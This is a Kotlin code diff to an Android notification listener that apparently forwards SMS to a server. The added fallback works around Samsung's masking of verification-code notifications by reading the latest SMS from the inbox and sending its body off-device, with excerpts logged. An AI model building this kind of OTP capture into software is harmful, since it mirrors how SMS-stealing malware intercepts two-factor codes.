@@ -64,8 +64,18 @@ class SmsNotificationListener : NotificationListenerService() {
         val message = bigText ?: text
         if (message.isBlank()) return
 
-        // 시스템 요약 알림 무시
-        if (title == "메시지" || title.isBlank() || message == "메시지 보기") return
+        // 가려진/요약 알림 (삼성 인증번호 보안알림 "메시지 보기" 등) →
+        // 알림 본문이 없으니 문자함(SMS content provider)에서 실제 내용을 읽어 전송.
+        // (OTP 문자가 "메시지 보기"로 가려져 안 오던 문제 해결)
+        if (title == "메시지" || title.isBlank() || message == "메시지 보기") {
+            val myPhoneFb = getSharedPreferences("settings", Context.MODE_PRIVATE)
+                .getString("my_phone_number", "unknown") ?: "unknown"
+            scope.launch {
+                delay(3000)   // 문자함에 기록될 시간 확보
+                sendLatestSmsFromContentProvider(myPhoneFb)
+            }
+            return
+        }
 
         // MessagingStyle에서 실제 메시지 본문 우선 추출 (발신자는 아래 폴백 체인에서 처리)
         var realMessage = message
@@ -326,6 +336,36 @@ class SmsNotificationListener : NotificationListenerService() {
             }
         }
         return normalizePhoneNumber(sender)
+    }
+
+    /** 가려진 알림("메시지 보기" 등)일 때 문자함에서 최신 SMS를 읽어 서버로 전송 */
+    private suspend fun sendLatestSmsFromContentProvider(myPhone: String) {
+        try {
+            val cursor = contentResolver.query(
+                Uri.parse("content://sms/inbox"),
+                arrayOf("address", "body", "date"),
+                null, null, "date DESC"
+            )
+            cursor?.use {
+                if (it.moveToFirst()) {
+                    val sender = normalizePhoneNumber(
+                        it.getString(it.getColumnIndexOrThrow("address")) ?: ""
+                    )
+                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
+                    if (body.isBlank()) return
+                    if (ProcessedMessages.isDuplicate(sender, body)) {
+                        Log.d(TAG, "가려진알림 폴백: 중복 → skip ($sender)")
+                        return
+                    }
+                    val msgType = if (body.toByteArray(Charsets.UTF_8).size > 80) "LMS" else "SMS"
+                    Log.d(TAG, "가려진알림 폴백 → 문자함에서 읽음: sender=$sender, ${body.take(30)}")
+                    AppLog.sms("가림알림폴백 [$sender] ${body.take(40)}")
+                    sendSmsToServer(myPhone, sender, body, msgType)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "가려진알림 문자함 폴백 오류: ${e.message}", e)
+        }
     }
 
     private fun extractMmsParts(
